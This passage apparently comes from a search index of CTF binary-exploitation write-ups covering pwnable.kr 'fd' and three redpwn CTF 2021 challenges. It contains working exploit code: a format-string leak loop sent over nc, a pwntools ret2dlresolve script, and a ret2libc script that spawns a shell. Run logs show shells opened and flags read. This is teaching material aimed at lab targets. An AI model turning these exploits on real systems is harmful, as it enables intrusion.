arguments including the filename at the beginning , if it doesn't then we get the message of passing an argument with the binary. Also we see that the variable *buf* is assigned 32 characters as buffer Then we see it has a variable *fd* which is assigned the value of atoi( argv[1] ) \u2014 0x1234 *atoi()* function converts ascii or string to integer And one more variable len* * which has value 0** After that we see that *len* value\u2019s changing to read(fd, buf, 32) Which puts the value of fd* * into the buf* * Then there is a string compare function( strcmp* *) checking whether the string is not equal to \u201c LETMEWIN\\n* *\u201d then it returns the message about learning Linux file I/O So what is this all about?? First let me tell you in short about file descriptors In Linux machine and C language , the Linux Descriptors have a value 0 for STDIN(Standard Input) , 1 for STDOUT(Standard Output) , 2 for STDERR(Standard Error) So if we look on man page of read() So we see that all it does is read from a file descriptor , so here if we can put 0 into fd , then we will be able to give an input to the program. First we try running the binary program We see without giving an argument , we get a message for passing an argument , so I just put a random number as an argument and see We get a message about learning linux file IO , so from the C code , we can see that all we had to do something is put a number which will get subtracted to 0x1234* * and make it a result of Zero.* * So we use python for this as its not that complicated We see the integer value for 0x1234* * is 4660* * , so we now pass this as an argument and see We can see that it got hung and most probably waiting for an input , so we now just pass the string which was there in the *strcmp()* function and see if we can get the flag We see that we get the message of good job followed by the flag , so we now copy and paste this on the challenge page to complete the challenge So here we paste the flag and click on Auth As I already pasted the flag before creating this writeup , so I got this message like above.","title":"Exploitation"},{"location":"Writeup/Binary%20Exploitation/fd/#reference","text":"File descriptor: https://en.wikipedia.org/wiki/File_descriptor C library function - atoi(): https://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm read(3) - Linux man page: https://linux.die.net/man/3/read Writeup from https://arkanoidctf.medium.com/pwnable-kr-writeup-fd-bf200047cfc2","title":"Reference"},{"location":"Writeup/Binary%20Exploitation/printf-please/","text":"printf-please Category: Binary Exploitation Source: redpwn CTF 2021 Author: NotDeGhost Score: 10 Description Be sure to say please... nc mc.ax 31569 Downloads please please.c Summary Classic leak the flag from the stack . Analysis Source Included #include <stdio.h> #include <fcntl.h> int main(void) { char buffer[0x200]; char flag[0x200]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); memset(buffer, 0, sizeof(buffer)); memset(flag, 0, sizeof(flag)); int fd = open(\"flag.txt\", O_RDONLY); if (fd == -1) { puts(\"failed to read flag. please contact an admin if this is remote\"); exit(1); } read(fd, flag, sizeof(flag)); close(fd); puts(\"what do you say?\"); read(0, buffer, sizeof(buffer) - 1); buffer[strcspn(buffer, \"\\n\")] = 0; if (!strncmp(buffer, \"please\", 6)) { printf(buffer); puts(\" to you too!\"); } } The flag is read into flag (on stack). To read, use the printf(buffer) vuln to read any arbitrary value from the stack with %xx$p where xx starts at 06 (top of stack). Since buffer is allocated first, you'll need to start at 0x200 / 8 + 6 (70). Oh, don't for get to start with please :-) Exploit #!/bin/bash for ((i=70;;i++)) { B=$(echo 'please %'$i'$p' | nc mc.ax 31569 | grep please | awk '{print $2}') if echo $B | grep '7d' >/dev/null 2>&1 then echo $B | sed 's/.*7d/7d/' | xxd -r -p | rev; echo break fi echo $B | awk -Fx '{print $2}' | xxd -r -p | rev } Output: # ./sol.sh flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl} Reference Writeup from https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2021/please","title":"printf-please"},{"location":"Writeup/Binary%20Exploitation/printf-please/#printf-please","text":"Category: Binary Exploitation Source: redpwn CTF 2021 Author: NotDeGhost Score: 10","title":"printf-please"},{"location":"Writeup/Binary%20Exploitation/printf-please/#description","text":"Be sure to say please... nc mc.ax 31569","title":"Description"},{"location":"Writeup/Binary%20Exploitation/printf-please/#downloads","text":"please please.c","title":"Downloads"},{"location":"Writeup/Binary%20Exploitation/printf-please/#summary","text":"Classic leak the flag from the stack .","title":"Summary"},{"location":"Writeup/Binary%20Exploitation/printf-please/#analysis","text":"","title":"Analysis"},{"location":"Writeup/Binary%20Exploitation/printf-please/#source-included","text":"#include <stdio.h> #include <fcntl.h> int main(void) { char buffer[0x200]; char flag[0x200]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); memset(buffer, 0, sizeof(buffer)); memset(flag, 0, sizeof(flag)); int fd = open(\"flag.txt\", O_RDONLY); if (fd == -1) { puts(\"failed to read flag. please contact an admin if this is remote\"); exit(1); } read(fd, flag, sizeof(flag)); close(fd); puts(\"what do you say?\"); read(0, buffer, sizeof(buffer) - 1); buffer[strcspn(buffer, \"\\n\")] = 0; if (!strncmp(buffer, \"please\", 6)) { printf(buffer); puts(\" to you too!\"); } } The flag is read into flag (on stack). To read, use the printf(buffer) vuln to read any arbitrary value from the stack with %xx$p where xx starts at 06 (top of stack). Since buffer is allocated first, you'll need to start at 0x200 / 8 + 6 (70). Oh, don't for get to start with please :-)","title":"Source Included"},{"location":"Writeup/Binary%20Exploitation/printf-please/#exploit","text":"#!/bin/bash for ((i=70;;i++)) { B=$(echo 'please %'$i'$p' | nc mc.ax 31569 | grep please | awk '{print $2}') if echo $B | grep '7d' >/dev/null 2>&1 then echo $B | sed 's/.*7d/7d/' | xxd -r -p | rev; echo break fi echo $B | awk -Fx '{print $2}' | xxd -r -p | rev } Output: # ./sol.sh flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}","title":"Exploit"},{"location":"Writeup/Binary%20Exploitation/printf-please/#reference","text":"Writeup from https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2021/please","title":"Reference"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/","text":"ret2generic-flag-reader Category: Binary Exploitation Source: redpwn CTF 2021 Author: pepsipu Score: 10 Description i'll ace this board meeting with my new original challenge! nc mc.ax 31077 Downloads ret2generic-flag-reader.c ret2generic-flag-reader https://static.redpwn.net/uploads/dedb887a5c49294ecd850d86728a0744c0e7ea780be8de2d4fc89f6948386937/libc-2.28.so) Summary I'm lumping all of these together since I used the exact same code on all of them. And I'm sure this was not the intended solution. I'm not going to cover all the internals or details of ret2dlresolve (in this write up, I'm working on a future article), however here are two good reads: https://syst3mfailure.io/ret2dl_resolve https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62 Analysis Checksec Arch: amd64-64-little Stack: No canary found PIE: No PIE (0x400000) All three had at least the above--all that is needed for easy ret2dlresolve with gets . That, and dynamically linked. Perhaps it's time to retire gets . Exploit (./getsome.py) #!/usr/bin/env python3 from pwn import * binary = context.binary = ELF(args.BIN) p = process(binary.path) p.sendline(cyclic(1024,n=8)) p.wait() core = p.corefile p.close() os.remove(core.file.name) padding = cyclic_find(core.read(core.rsp, 8),n=8) log.info('padding: ' + hex(padding)) rop = ROP(binary) ret = rop.find_gadget(['ret'])[0] dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh']) rop.raw(ret) rop.gets(dl.data_addr) rop.ret2dlresolve(dl) if args.REMOTE: p = remote(args.HOST, args.PORT) else: p = process(binary.path) payload = b'' payload += padding * b'A' payload += rop.chain() payload += b'\\n' payload += dl.payload p.sendline(payload) p.interactive() To exploit most x86_64 gets challenges just type: ./getsome.py BIN=./binary HOST=host PORT=port REMOTE=1 Thanks it, get your flag and move on. How does this script work? Well, first the padding is computing by crashing the binary and extracting the payload from the core to compute the distance to the return address on the stack. Then, ret2dlresolve is used to get a shell. See the retdlresolve links above. Output: # ./getsome.py BIN=./beginner-generic-pwn-number-0 HOST=mc.ax PORT=31199 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0': pid 265 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' stopped with exit code -11 (SIGSEGV) (pid 265) [!] Error parsing corefile stack: Found bad environment at 0x7fffed221f4f [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/core.265' Arch: amd64-64-little RIP: 0x4012be RSP: 0x7fffed2205b8 Exe: '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' (0x400000) Fault: 0x6161616161616168 [*] padding: 0x38 [*] Loaded 14 cached gadgets for './beginner-generic-pwn-number-0' [+] Opening connection to mc.ax on port 31199: Done [*] Switching to interactive mode \"\ud835\ude31\ud835\ude2d\ud835\ude26\ud835\ude22\ud835\ude34\ud835\ude26 \ud835\ude38\ud835\ude33\ud835\ude2a\ud835\ude35\ud835\ude26 \ud835\ude22 \ud835\ude31\ud835\ude38\ud835\ude2f \ud835\ude34\ud835\ude30\ud835\ude2e\ud835\ude26\ud835\ude35\ud835\ude2a\ud835\ude2e\ud835\ude26 \ud835\ude35\ud835\ude29\ud835\ude2a\ud835\ude34 \ud835\ude38\ud835\ude26\ud835\ude26\ud835\ude2c\" rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self! can you write me a heartfelt message to cheer me up? :( $ cat flag.txt flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me} # ./getsome.py BIN=./ret2generic-flag-reader HOST=mc.ax PORT=31077 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader': pid 312 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' stopped with exit code -11 (SIGSEGV) (pid 312) [!] Error parsing corefile stack: Found bad environment at 0x7fffe4f21f61 [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/core.312' Arch: amd64-64-little RIP: 0x40142f RSP: 0x7fffe4f20028 Exe: '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' (0x400000) Fault: 0x6161616161616166 [*] padding: 0x28 [*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' [+] Opening connection to mc.ax on port 31077: Done [*] Switching to interactive mode alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable... how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function! slap on some flavortext and there's no way rob will fire me now! this is genius!! what do you think? $ cat flag.txt flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage} # ./getsome.py BIN=./ret2the-unknown HOST=mc.ax PORT=31568 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown': pid 361 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' stopped with exit code -11 (SIGSEGV) (pid 361) [!] Error parsing corefile stack: Found bad environment at 0x7ffcd8878f79 [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/core.361' Arch: amd64-64-little RIP: 0x401237 RSP: 0x7ffcd8876cf8 Exe: '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' (0x400000) Fault: 0x6161616161616166 [*] padding: 0x28 [*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' [+] Opening connection to mc.ax on port 31568: Done [*] Switching to interactive mode that board meeting was a *smashing* success! rob loved the challenge! in fact, he loved it so much he sponsored me a business trip to this place called 'libc'... where is this place? can you help me get there safely? phew, good to know. shoot! i forgot! rob said i'd need this to get there: 7f6564131560 good luck! $ cat flag.txt flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing} Reference Writeup from https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2021/getsome_beginner-generic-pwn-number-0_ret2generic-flag-reader_ret2the-unknown","title":"ret2generic-flag-reader"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#ret2generic-flag-reader","text":"Category: Binary Exploitation Source: redpwn CTF 2021 Author: pepsipu Score: 10","title":"ret2generic-flag-reader"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#description","text":"i'll ace this board meeting with my new original challenge! nc mc.ax 31077","title":"Description"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#downloads","text":"ret2generic-flag-reader.c ret2generic-flag-reader https://static.redpwn.net/uploads/dedb887a5c49294ecd850d86728a0744c0e7ea780be8de2d4fc89f6948386937/libc-2.28.so)","title":"Downloads"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#summary","text":"I'm lumping all of these together since I used the exact same code on all of them. And I'm sure this was not the intended solution. I'm not going to cover all the internals or details of ret2dlresolve (in this write up, I'm working on a future article), however here are two good reads: https://syst3mfailure.io/ret2dl_resolve https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62","title":"Summary"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#analysis","text":"","title":"Analysis"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#checksec","text":"Arch: amd64-64-little Stack: No canary found PIE: No PIE (0x400000) All three had at least the above--all that is needed for easy ret2dlresolve with gets . That, and dynamically linked. Perhaps it's time to retire gets .","title":"Checksec"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#exploit-getsomepy","text":"#!/usr/bin/env python3 from pwn import * binary = context.binary = ELF(args.BIN) p = process(binary.path) p.sendline(cyclic(1024,n=8)) p.wait() core = p.corefile p.close() os.remove(core.file.name) padding = cyclic_find(core.read(core.rsp, 8),n=8) log.info('padding: ' + hex(padding)) rop = ROP(binary) ret = rop.find_gadget(['ret'])[0] dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh']) rop.raw(ret) rop.gets(dl.data_addr) rop.ret2dlresolve(dl) if args.REMOTE: p = remote(args.HOST, args.PORT) else: p = process(binary.path) payload = b'' payload += padding * b'A' payload += rop.chain() payload += b'\\n' payload += dl.payload p.sendline(payload) p.interactive() To exploit most x86_64 gets challenges just type: ./getsome.py BIN=./binary HOST=host PORT=port REMOTE=1 Thanks it, get your flag and move on. How does this script work? Well, first the padding is computing by crashing the binary and extracting the payload from the core to compute the distance to the return address on the stack. Then, ret2dlresolve is used to get a shell. See the retdlresolve links above. Output: # ./getsome.py BIN=./beginner-generic-pwn-number-0 HOST=mc.ax PORT=31199 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0': pid 265 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' stopped with exit code -11 (SIGSEGV) (pid 265) [!] Error parsing corefile stack: Found bad environment at 0x7fffed221f4f [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/core.265' Arch: amd64-64-little RIP: 0x4012be RSP: 0x7fffed2205b8 Exe: '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' (0x400000) Fault: 0x6161616161616168 [*] padding: 0x38 [*] Loaded 14 cached gadgets for './beginner-generic-pwn-number-0' [+] Opening connection to mc.ax on port 31199: Done [*] Switching to interactive mode \"\ud835\ude31\ud835\ude2d\ud835\ude26\ud835\ude22\ud835\ude34\ud835\ude26 \ud835\ude38\ud835\ude33\ud835\ude2a\ud835\ude35\ud835\ude26 \ud835\ude22 \ud835\ude31\ud835\ude38\ud835\ude2f \ud835\ude34\ud835\ude30\ud835\ude2e\ud835\ude26\ud835\ude35\ud835\ude2a\ud835\ude2e\ud835\ude26 \ud835\ude35\ud835\ude29\ud835\ude2a\ud835\ude34 \ud835\ude38\ud835\ude26\ud835\ude26\ud835\ude2c\" rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self! can you write me a heartfelt message to cheer me up? :( $ cat flag.txt flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me} # ./getsome.py BIN=./ret2generic-flag-reader HOST=mc.ax PORT=31077 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader': pid 312 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' stopped with exit code -11 (SIGSEGV) (pid 312) [!] Error parsing corefile stack: Found bad environment at 0x7fffe4f21f61 [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/core.312' Arch: amd64-64-little RIP: 0x40142f RSP: 0x7fffe4f20028 Exe: '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' (0x400000) Fault: 0x6161616161616166 [*] padding: 0x28 [*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' [+] Opening connection to mc.ax on port 31077: Done [*] Switching to interactive mode alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable... how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function! slap on some flavortext and there's no way rob will fire me now! this is genius!! what do you think? $ cat flag.txt flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage} # ./getsome.py BIN=./ret2the-unknown HOST=mc.ax PORT=31568 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown': pid 361 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' stopped with exit code -11 (SIGSEGV) (pid 361) [!] Error parsing corefile stack: Found bad environment at 0x7ffcd8878f79 [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/core.361' Arch: amd64-64-little RIP: 0x401237 RSP: 0x7ffcd8876cf8 Exe: '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' (0x400000) Fault: 0x6161616161616166 [*] padding: 0x28 [*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' [+] Opening connection to mc.ax on port 31568: Done [*] Switching to interactive mode that board meeting was a *smashing* success! rob loved the challenge! in fact, he loved it so much he sponsored me a business trip to this place called 'libc'... where is this place? can you help me get there safely? phew, good to know. shoot! i forgot! rob said i'd need this to get there: 7f6564131560 good luck! $ cat flag.txt flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}","title":"Exploit (./getsome.py)"},{"location":"Writeup/Binary%20Exploitation/ret2generic-flag-reader/#reference","text":"Writeup from https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2021/getsome_beginner-generic-pwn-number-0_ret2generic-flag-reader_ret2the-unknown","title":"Reference"},{"location":"Writeup/Binary%20Exploitation/ret2the-unknown/","text":"ret2the-unknown Category: Binary Exploitation Source: redpwn CTF 2021 Author: pepsipu Score: 10 Description hey, my company sponsored map doesn't show any location named \"libc\"! nc mc.ax 31568 Downloads ret2the-unknown.c ld-2.28.so ret2the-unknown libc-2.28.so Solution Checksums (SHA-1): 4196dfaca4fc796710efd3dd37bd8f5c8010b11d ld-2.28.so 13d8d9f665c1f3a087e366e9092c112a0b8e100f libc-2.28.so 4be711c76823689dc21689f7d7324b048b978153 ret2the-unknown 4d1b7852d772135c17e573cd6aeb4cad434a0f30 ret2the-unknown.c This is a textbook ret2libc challenge without much else going on, and thus a great opportunity for me to explain ret2libc attacks! As with any binary exploitation (pwn) challenge, let's first start by interacting with the program and looking for vulnerabilities. In order to make the ret2the-unknown binary use the given ld-2.28.so and libc-2.28.so , we can use patchelf as well as setting the LD_PRELOAD before executing the binary. We'll also of course remember to make ret2the-unknown executable using chmod so that we can run it. Let's check the security of the binary while we're at it as well using pwntools. $ chmod +x ./ret2the-unknown $ pwn checksec ./ret2the-unknown $ patchelf --set-interpreter ./ld-2.28.so ./ret2the-unknown $ LD_PRELOAD=./libc-2.28.so ./ret2the-unknown Alright, cool. The program takes some input from us and then spits out an address. There's partial RELRO, no stack canary, and no PIE, although there is NX. Partial/no RELRO is usually useful for PLT/GOT attacks, no stack canary is usually useful for overflow attacks, and no PIE is usually useful in general for all sorts of attacks. The source code of the binary is also given in ret2the-unknown.c : #include <stdio.h> #include <string.h> int main(void) { char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(\"that board meeting was a *smashing* success! rob loved the challenge!\"); puts(\"in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...\"); puts(\"where is this place? can you help me get there safely?\"); // please i cant afford the medical bills if we crash and segfault gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc); puts(\"phew, good to know. shoot! i forgot!\"); printf(\"rob said i'd need this to get there: %llx\\n\", printf); puts(\"good luck!\"); } The address that was given was the address of printf , a libc function. Knowing the address of anything in libc is useful because we can calculate the base address of the loaded libc by taking the difference between the address present in the static libc file and the address present in the loaded libc. Once we know the base address of the libc, then we can calculate the address of all other libc items using their offsets. Already, we can see that this program is vulnerable to a ret2libc attack. Being able to calculate the base address of the libc means that we know the address of system . All we need to do is search through the libc for a pop rdi; ret; gadget and \"/bin/sh\" string and we can execute system(\"/bin/sh\"); . Overflow the buffer, overwrite the return address with the address of our pop rdi; ret; gadget, \"/bin/sh\" string, and system address in libc and we have a shell! However, there's one problem: we're given the printf address after we write to a buffer. This printf address does not stay the same, as we can see: This interrupts our original attack plan. Overflowing the buffer and overwriting the return address with our exploit, which includes the system address from libc, requires knowing the base address of the libc to begin with in order to be calculated. This is where the binary having PIE disabled will help us. Because PIE is disabled, the program is loaded into the same memory address each time it is run. Thus, the address of main is predictable. $ objdump -d -M intel ./ret2the-unknown | grep \"<main>:\" Great! main has the address 0x401186 . If we were to overflow the buffer and overwrite the return address with main 's address, then the program will repeat itself. With this slight adjustment, our attack plan is complete: 0: Get the offset of a pop rdi; ret; gadget in the given static libc file. 1: Use a buffer overflow to overwrite the return address of main with the address of main . This will cause the main function to repeat itself once more. 2: The main function will give us the address of the loaded printf function from libc. 3: main will repeat itself thanks to our overflow from part 1. 4: Calculate the libc base address using the address of the loaded printf function from part 2. This is equal to the given loaded printf address minus the printf offset from the static libc file. 5: Use the libc base address to calculate the real address of the pop rdi; ret; gadget using its offset from part 0. 6: Use the calculated libc base address to calculate the real address of a \"/bin/sh\" string in the libc. 7: Use the libc base address to calculate the real address of the system function in libc. 8: Use a buffer overflow to overwrite the return address of main with <addr_gadget><addr_binsh><addr_system> . 9: Get a shell! Starting off with part 0, you can easily find gadgets using a tool like ropper . Now we know that there's a pop rdi; ret; at 0x023a5f . Note that this was found in the given static libc file, meaning that it hasn't been loaded yet. This is why it's so important to calculate the base address of the loaded libc in the program. 0x023a5f here is essentially the offset of the gadget, so to find the address of the same gadget in the running program, we just add it to the loaded libc's base address. The entire exploit can be easily scripted in Python with pwntools. Part 1 would look something like the following. Note that we need 32 bytes plus an additional 8 bytes to get to the return address. You can find out how many bytes you need to write to a buffer to get to the return address by overflowing with a pattern and seeing what address it will try to return to in a debugger like gdb : exploit = b\"A\" * (32+8) exploit += p64(0x401186) Remember that 0x401186 was just the address of main that we discovered earlier. This code creates an exploit consisting of 32+8 bytes of padding plus the address of main , effectively making main return to main and therefore running itself one more time. Part 2 can be read by parsing the data returned by the program. Based on the input, I got something like the following to extract the given hexadecimal address from the program: printf_addr = p.recvuntil(\"luck!\").decode(\"utf-8\").split(\"\\n\")[0] printf_addr = int(printf_addr, 16) The program will automatically repeat itself as planned in part 3. We can now calculate the libc base address using printf_addr from part 2. In fact, we can actually declare the base address in pwntools itself so that all future searches and lookups will use this base address: libc = ELF(\"./libc-2.28.so\") libc.address = printf_addr - libc.symbols[\"printf\"] What this code will do is it will load the libc file, take the printf_addr the program gave us, and subtract the offset of prinf from the libc file from it, therefore giving us the base address of the loaded libc. Part 4 complete! Therefore, the pop rdi; ret; gadget is located at this base address plus 0x023a5f . We can search through the libc for \"/bin/sh\" and system with pwntools now that we've declared its base address. We of course need to remember our padding as well to slide over to the return address. Parts 5-8, done: exploit = b\"B\" * (32+8) exploit += p64(libc.address + POP_RDI_RET) exploit += p64(next(libc.search(b\"/bin/sh\"))) exploit += p64(libc.symbols[\"system\"]) Our final exploit code will look something like the following: #!/usr/bin/env python3 from pwn import * # Gadget offsets. POP_RDI_RET = 0x00023a5f # pop rdi; ret; # Remote switch. REMOTE = True def main(): # Load the files. vuln = ELF(\"./ret2the-unknown\") libc = ELF(\"./libc-2.28.so\") # Connect to the target. if REMOTE: p = remote(\"mc.ax\", 31568) else: p = process(\"./ret2the-unknown\", env={\"LD_PRELOAD\": \"./libc-2.28.so\"}) # Overwrite ret. addr. with main's addr. exploit = b\"A\" * (32+8) # Padding to get to ret. exploit += p64(0x401186) # main() address overwrites ret. log.info(\"Overwriting return address with main.\") p.recvuntil(\"safely?\") p.sendline(exploit) # main should repeat and give us printf addr. p.recvuntil(\"there: \") printf_addr = p.recvuntil(\"luck!\").decode(\"utf-8\").split(\"\\n\")[0] # Calculate the offsets and addresses. printf_addr = int(printf_addr, 16) # Load the printf address. libc.address = printf_addr - libc.symbols[\"printf\"] # Calculate and set the libc address. # Create the exploit that overwrites ret. addr. with shellcode. exploit = b\"B\" * (32+8) # Padding to get to ret. exploit += p64(libc.address + POP_RDI_RET) # Gadget: pop rdi; ret; exploit += p64(next(libc.search(b\"/bin/sh\"))) # Pass /bin/sh. exploit += p64(libc.symbols[\"system\"]) # Call system(). # Send the exploit. log.info(\"Delivering exploit.\") p.recvuntil(\"safely?\") p.sendline(exploit) # Interact with the shell. log.info(\"Spawning shell.\") p.recvuntil(\"luck!\") p.interactive() if __name__ == \"__main__\": main() Launch the exploit and sure enough, we have a shell: It's a textbook ret2libc attack. Reference Writeup from https://irissec.xyz/articles/categories/binex/2021-07-18/Executing-a-Textbook-ret2libc-Attack-to-Pop-a-Shell","title":"ret2the-unknown"},{"location":"Writeup/Binary%20Exploitation/ret2the-unknown/#ret2the-unknown","text":"Category: Binary Exploitation Source: redpwn CTF 2021 Author: pepsipu Score: 10","title":"ret2the-unknown"},{"location":"Writeup/Binary%20Exploitation/ret2the-unknown/#description","text":"hey, my company sponsored map doesn't show any location named \"libc\"! nc mc.ax 31568","title":"Description"},{"location":"Writeup/Binary%20Exploitation/ret2the-unknown/#downloads","text":"ret2the-unknown.c ld-2.28.so ret2the-unknown libc-2.28.so","title":"Downloads"},{"location":"Writeup/Binary%20Exploitation/ret2the-unknown/#solution","text":"Checksums (SHA-1): 4196dfaca4fc796710efd3dd37bd8f5c8010b11d ld-2.28.so 13d8d9f665c1f3a087e366e9092c112a0b8e100f libc-2.28.so 4be711c76823689dc21689f7d7324b048b978153 ret2the-unknown 4d1b7852d772135c17e573cd6aeb4cad434a0f30 ret2the-unknown.c This is a textbook ret2libc challenge without much else going on, and thus a great opportunity for me to explain ret2libc attacks! As with any binary exploitation (pwn) challenge, let's first start by interacting with the program and looking for vulnerabilities. In order to make the ret2the-unknown binary use the given ld-2.28.so and libc-2.28.so , we can use patchelf as well as setting the LD_PRELOAD before executing the binary. We'll also of course remember to make ret2the-unknown executable using chmod so that we can run it. Let's check the security of the binary while we're at it as well using pwntools. $ chmod +x ./ret2the-unknown $ pwn checksec ./ret2the-unknown $ patchelf --set-interpreter ./ld-2.28.so ./ret2the-unknown $ LD_PRELOAD=./libc-2.28.so ./ret2the-unknown Alright, cool. The program takes some input from us and then spits out an address. There's partial RELRO, no stack canary, and no PIE, although there is NX. Partial/no RELRO is usually useful for PLT/GOT attacks, no stack canary is usually useful for overflow attacks, and no PIE is usually useful in general for all sorts of attacks. The source code of the binary is also given in ret2the-unknown.c : #include <stdio.h> #include <string.h> int main(void) { char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(\"that board meeting was a *smashing* success! rob loved the challenge!\"); puts(\"in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...\"); puts(\"where is this place? can you help me get there safely?\"); // please i cant afford the medical bills if we crash and segfault gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc); puts(\"phew, good to know. shoot! i forgot!\"); printf(\"rob said i'd need this to get there: %llx\\n\", printf); puts(\"good luck!\"); } The address that was given was the address of printf , a libc function. Knowing the address of anything in libc is useful because we can calculate the base address of the loaded libc by taking the difference between the address present in the static libc file and the address present in the loaded libc. Once we know the base address of the libc, then we can calculate the address of all other libc items using their offsets. Already, we can see that this program is vulnerable to a ret2libc attack. Being able to calculate the base address of the libc means that we know the address of system . All we need to do is search through the libc for a pop rdi; ret; gadget and \"/bin/sh\" string and we can execute system(\"/bin/sh\"); . 